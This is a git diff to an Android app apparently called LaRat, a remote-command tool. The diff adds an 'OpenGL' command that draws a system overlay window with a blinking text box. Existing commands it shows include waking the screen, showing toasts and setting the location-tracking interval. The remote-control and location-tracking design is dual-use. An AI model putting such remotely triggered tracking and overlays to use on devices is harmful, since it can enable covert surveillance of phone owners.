@@ -1,15 +1,18 @@
 package com.c4wd.larat;
 
 import android.content.Context;
+import android.graphics.PixelFormat;
 import android.os.AsyncTask;
 import android.os.PowerManager;
-import android.preference.PreferenceManager;
+import android.view.Gravity;
+import android.view.ViewGroup;
+import android.view.WindowManager;
+import android.widget.ImageView;
 import android.widget.Toast;
 
-import java.io.UnsupportedEncodingException;
+import com.larat.drawing.BlinkingTextBox;
+
 import java.util.HashMap;
-import java.util.LinkedList;
-import java.util.List;
 
 /**
  * Created by cory on 10/4/15.
@@ -28,6 +31,7 @@ public class Command {
         commandList.put("ScreenOn", new ScreenOnTask());
         commandList.put("SetLocationInterval", new SetLocationIntervalTask());
         commandList.put("Toast", new ToastTask());
+        commandList.put("OpenGL", new OpenGLViewTask());
     }
 
     public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
@@ -75,6 +79,46 @@ public class Command {
             LaRatLocationManager.LOCATION_REQUEST_INTERVAL = interval;
             LaRatLocationManager.startLocationService(context.getContext());
             return null;
+        }
+    }
+
+    public static class OpenGLViewTask extends AsyncTask<Object, Void, Void> {
+
+        private CommandContext context;
+
+        @Override
+        protected Void doInBackground(Object... objects) {
+            this.context = (CommandContext)(objects[0]);
+            return null;
+        }
+
+        @Override
+        protected void onPostExecute(Void returnValue) {
+            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_PHONE,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                    PixelFormat.TRANSLUCENT);
+
+            params.gravity = Gravity.FILL;
+            params.x = 0;
+            params.y = 0;
+
+            /*GLSurfaceView view = new GLSurfaceView(context.getContext());
+            view.setRenderer(new OpenGLRenderer());
+            ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(80, 80);
+            view.setLayoutParams(layoutParams);*/
+
+            /*ImageView view = new ImageView(context.getContext());
+            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));
+            view.setImageBitmap();*/
+
+            BlinkingTextBox view = new BlinkingTextBox("test", context.getContext());
+
+            windowManager.addView(view, params);
         }
 
     }
